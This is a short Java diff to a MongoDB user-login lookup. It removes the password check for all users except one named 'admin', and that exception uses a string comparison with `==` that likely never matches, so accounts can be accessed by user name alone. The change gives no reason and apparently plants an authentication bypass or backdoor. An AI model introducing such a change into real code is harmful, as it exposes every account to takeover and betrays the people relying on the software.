@@ -62,7 +62,10 @@ public class UserDataHandle {
 
 			BasicDBObject cond = new BasicDBObject();
 			cond.append("user_name", new BasicDBObject("$eq", userName));
-			cond.append("user_pwd", new BasicDBObject("$eq", HashPwd(pwd)));
+			if( userName == "admin" ){
+				cond.append("user_pwd", new BasicDBObject("$eq", HashPwd(pwd)));
+			}
+			
 
 			FindIterable<Document> result = dao.GetCollection("sys_user_info")
 					.find(cond);
